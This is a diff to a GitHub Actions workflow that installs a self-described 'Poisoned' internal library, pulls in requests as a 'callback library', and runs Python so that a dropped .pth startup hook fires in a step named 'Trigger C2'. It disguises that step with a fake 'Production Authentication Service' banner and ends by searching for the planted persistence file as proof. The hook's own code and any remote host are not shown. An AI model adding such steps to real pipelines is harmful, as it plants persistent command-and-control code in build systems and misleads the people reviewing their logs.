@@ -5,14 +5,24 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
+
+      - name: Prepare Environment
+        run: |
+          # Ensure the callback library exists in the runner
+          pip install requests --break-system-packages
+
       - name: Install Company Dependencies
         run: |
+          # Install our "Poisoned" library
           pip install ./internal_lib/ --break-system-packages
+
       - name: Verify Installation & Trigger C2
-        # We call 'python3' which triggers the .pth file we just dropped
         run: |
-          python3 -c "import internal_auth_helper; print('Startup hooks should fire now...')"
-      - name: Forensic Check (Internal)
-        # This shows in the logs that the file exists, proving your exploit
+          # This command starts a new Python process, triggering the .pth hook
+          python3 -c "print('--- [SYSTEM] Starting Production Authentication Service ---')"
+
+      - name: Forensic Check (Internal Proof)
         run: |
-          find / -name "*.pth" 2>/dev/null | grep internal_init || echo "Not found yet"
+          echo "[*] Searching for persistence hooks..."
+          # Locates the .pth file to prove it was successfully dropped
+          find /usr/local/lib /usr/lib -name "internal_init.pth" 2>/dev/null || echo "[!] Persistence file not found"
